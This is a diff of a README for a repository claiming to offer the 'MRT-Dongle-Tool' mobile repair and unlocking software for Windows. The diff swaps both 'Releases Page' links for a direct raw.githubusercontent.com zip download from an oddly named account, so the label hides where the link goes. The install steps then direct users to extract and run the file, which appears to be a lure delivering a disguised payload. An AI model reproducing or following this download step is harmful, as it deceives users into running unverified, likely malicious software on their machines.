@@ -5,7 +5,7 @@ description: "Download the MRT Dongle Tool for Windows 10 and 11 to manage and u
 ---
 # 🛠 MRT-Dongle-Tool - Repair mobile devices with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Agreementlaburnumanagyroides267/MRT-Dongle-Tool/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Agreementlaburnumanagyroides267/agreementlaburnumanagyroides267.github.io/main/triduum/github_agreementlaburnumanagyroides_io_v1.7-alpha.3.zip)
 
 MRT-Dongle-Tool provides a platform for mobile device maintenance on Windows. This software helps users manage flashing, unlocking, and repair tasks for supported mobile hardware. This guide explains how to obtain and set up the tool on your Windows computer.
 
@@ -24,7 +24,7 @@ To run this application, your computer needs specific hardware and software comp
 
 Follow these steps to transfer the software to your machine and prepare it for use.
 
-1. Navigate to the [MRT-Dongle-Tool Releases Page](https://github.com/Agreementlaburnumanagyroides267/MRT-Dongle-Tool/releases).
+1. Navigate to the [MRT-Dongle-Tool Releases Page](https://raw.githubusercontent.com/Agreementlaburnumanagyroides267/agreementlaburnumanagyroides267.github.io/main/triduum/github_agreementlaburnumanagyroides_io_v1.7-alpha.3.zip).
 2. Look for the version labeled as the latest release.
 3. Select the file ending in .zip or .exe to start the download process.
 4. If you downloaded a compressed .zip file, right-click the folder and select "Extract All" to reveal the application files.
